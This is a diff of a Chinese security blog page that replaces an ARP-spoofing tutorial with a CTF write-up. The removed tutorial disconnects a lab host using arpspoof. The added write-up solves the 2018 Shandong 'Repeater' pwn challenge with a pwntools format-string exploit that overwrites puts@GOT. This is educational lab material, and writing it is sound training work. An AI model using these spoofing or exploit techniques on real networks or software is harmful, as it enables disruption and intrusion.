@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Kali 下的 ARP断网实验实现过程 | W1therC&#39;s blog</title>
+  <title>[Pwn]2018年山东省科来杯Pwn题目Repeater复现 | W1therC&#39;s blog</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -169,79 +169,39 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2022-05-12T09:03:00.000Z" itemprop="datePublished">
+      <time datetime="2022-05-12T08:57:10.000Z" itemprop="datePublished">
           2022-05-12
       </time>
     
 </span>
-                <h1>Kali 下的 ARP断网实验实现过程</h1>
+                <h1>[Pwn]2018年山东省科来杯Pwn题目Repeater复现</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><ul>
-<li><p>Kali Linux</p>
-<p>简单来说，Kali 就是一个建立在虚拟机上用于做网络安全攻防的系统，Kali自身具有一定的优势，例如自带上百个渗透测试工具，开源Git树，并且它完全免费。</p>
-<p>kali拥有安全的开发环境，并且你完全不用担心在kali上做网络攻防实验时会影响到本机的文件，因此进入了kali，人人皆Geek.</p>
-<p>关于虚拟机的话，我用的是VBOX，虚拟机的种类有很多，看个人喜好吧。</p>
-</li>
-<li><p>Arp(地址解析协议)</p>
-<p>地址解析协议，即ARP（Address Resolution Protocol），是根据<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>获取<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129">物理地址</a>的一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE">TCP&#x2F;IP协议</a>。<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p>
-</li>
-<li><p>Arp欺骗</p>
-</li>
-</ul>
-<p>​        地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时<em><strong>不会检测该报文的真实性</strong></em>就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97">ARP欺骗</a></p>
-<h1 id="进行Arp断网欺骗"><a href="#进行Arp断网欺骗" class="headerlink" title="进行Arp断网欺骗"></a>进行Arp断网欺骗</h1><ul>
-<li><p>首先打开并进入kali(此篇blog以VBOX虚拟机为例讲解)<br><img src="https://img-blog.csdnimg.cn/20191002102844921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-</li>
-<li><p>进行Arp欺骗的目标主机<br><img src="https://img-blog.csdnimg.cn/20191002102936505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-</li>
-<li></li>
-</ul>
-<ol>
-<li>ifconfig :查询本机ip地址</li>
-</ol>
-<p><img src="https://img-blog.csdnimg.cn/20191002103105515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由此可以看到ip地址为 10.0.2.4</p>
-<ol start="2">
-<li>netstat -rn ：查询网关和子掩网码<br><img src="https://img-blog.csdnimg.cn/20191002103144926.png" alt="在这里插入图片描述"></li>
-</ol>
-<p>由此可以看到 Gateway(网关)：10.0.2.1 和 Genmask(子掩网码): 255.255.255.0</p>
-<p>Destination(终端): 10.0.2.0</p>
-<ol start="3">
-<li>Map -A 终端&#x2F;子网掩码的<strong>对位点分十进制格式</strong></li>
-</ol>
-<p>此处的子网掩码的<strong>对位点分十进制格式</strong>可用<strong>子网掩码转换器</strong>进行计算<br><img src="https://img-blog.csdnimg.cn/20191002103205219.png" alt="在这里插入图片描述"><br>在线计算器传送门：<a target="_blank" rel="noopener" href="https://tool.520101.com/wangluo/ipjisuan/">https://tool.520101.com/wangluo/ipjisuan/</a></p>
-<p><img src="https://img-blog.csdnimg.cn/20191002103223157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>以上均为此局域网内的主机</p>
-<p>但目前接入的只有我们的目标主机：10.0.2.4</p>
-<p>Network Distance为网络距离，因为两个ip同时在一个局域网里因此网络距离为0</p>
-<p>4.我们来确认一下目标主机在此局域网内是否可以上网</p>
-<p>利用ping <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> 来检查是否可以接受数据</p>
-<p><img src="https://img-blog.csdnimg.cn/20191002103250437.png" alt="在这里插入图片描述"><br>由此图可以看出目标主机现在是可以上网的，并且丢失率为0</p>
-<ol start="5">
-<li>最后 输入指令 arpspoof -i eh0 -t 目标主机ip 网关</li>
-</ol>
-<p><img src="https://img-blog.csdnimg.cn/20191002103307415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入后敲回车即可看见已开始向目标主机发送ARP应答消息</p>
-<p>此时，我们回到目标主机，再次进行ping <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
-<p><img src="https://img-blog.csdnimg.cn/20191002103320976.png" alt="在这里插入图片描述"><br>可以看到目标主机请求不到主机，并且打不开网页<br><img src="https://img-blog.csdnimg.cn/20191002103328178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>即此次Arp欺骗成功</p>
-<ol start="6">
-<li>最后按control+c 结束发送数据停止此次欺骗实验</li>
-</ol>
-<p><img src="https://img-blog.csdnimg.cn/20191002103343711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h1><p>最后说一下此arp断网欺骗仅适用于同局域网下的主机间</p>
+      		<h1 id="2018年山东省科来杯Pwn题目Repeater复现"><a href="#2018年山东省科来杯Pwn题目Repeater复现" class="headerlink" title="2018年山东省科来杯Pwn题目Repeater复现"></a>2018年山东省科来杯Pwn题目Repeater复现</h1><h2 id="补充一点汇编语言基础知识"><a href="#补充一点汇编语言基础知识" class="headerlink" title="补充一点汇编语言基础知识"></a>补充一点汇编语言基础知识</h2><p>对于我这种对汇编语言不怎么感冒的人来说，补充一些相应的汇编语言的基础知识还是很重要的</p>
+<p>这里就针对本题中用到的汇编指令进行相应补充</p>
+<p>lea与mov的区别：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax (相当于把地址赋给eax)，而不是把ebx+8处的内存地址里的数据赋给eax。</p>
+<p>而mov指令则恰恰相反，例如：<br>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p>
+<p>cmp(compare)指令进行比较两个操作数的大小，若执行指令后ZF&#x3D;1<br>则说明两个数相等，因为zero为1说明结果为0。</p>
+<p>jnz结果不为零（或不相等）则转移，jz即零标志为1就跳转。<br>ZF汇编语言中的PSW标志寄存器中的一位，而JZ则是根据ZF决定是否跳转。<br>jz&#x3D;jump if zero，即零标志为1就跳转，一般与cmp连用，用以判断两数是否相等。jz的另一种写法就是je，je&#x3D;jump if equal，jz和je的作用是完全一样的。</p>
+<h2 id="Repeater-WP"><a href="#Repeater-WP" class="headerlink" title="Repeater WP"></a>Repeater WP</h2><p>checksec 一下题目所给文件<br><img src="https://img-blog.csdnimg.cn/20201030103445340.png#pic_center" alt="在这里插入图片描述"><br>运行一下试试看<br><img src="https://img-blog.csdnimg.cn/20201030104011498.png#pic_center" alt="在这里插入图片描述"><br>好像看不出什么<br>测试一下格式化字符串漏洞<br><img src="https://img-blog.csdnimg.cn/20201030104054282.png#pic_center"><br>数一下 偏移为4<br>丢进ida看一下主程序<br>ctrl 1 看一下字符串，发现敏感字符串<br><img src="https://img-blog.csdnimg.cn/20201030104207828.png#pic_center" alt="在这里插入图片描述"><br>双击 ctrl x 跟进<br><img src="https://img-blog.csdnimg.cn/20201030104347614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以发现程序有call语句调用system，而system就是输出flag地址从而得到flag</p>
+<p>但是根据上面的汇编语句或者getflag字段内容可以发现这里存在一个判断语句<br><img src="https://img-blog.csdnimg.cn/20201030104723973.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030104802774.png#pic_center" alt="在这里插入图片描述"><br>2018h &#x3D; (8216)₁₀，判断 eax是否等于8216 ，ZF&#x3D;1则两数相等，相应的ZF&#x3D;1意味着结果为0，即jnz不跳转。随即执行将eax压入栈，再执行call语句调用，即可得到flag。</p>
+<p>根据偏移为4 编写exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./repeater&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./repeater&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;puts_got:<span class="number">0x8048638</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行即可得到flag</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
-    <a class="pull-left" href="/2022/05/12/hello-world/" style="float: left;">
-        ← MAC下 安装sqlmap教程
+    <a class="pull-left" href="/2022/05/12/%5BPwn%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%A2%98%E7%9B%AEwp--guess_num,hello_pwn/" style="float: left;">
+        ← [Pwn]攻防世界pwn题目wp--guess_num,hello_pwn
     </a>
     
     
-    <a class="pull-right" href="/2022/05/12/111/">
-        [Pwn]攻防世界pwn题目wp--guess_num,hello_pwn →
+    <a class="pull-right" href="/2022/05/12/scrapy%20quotesbot%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">
+        scrapy quotesbot 源码分析 →
     </a>
     
 </nav>
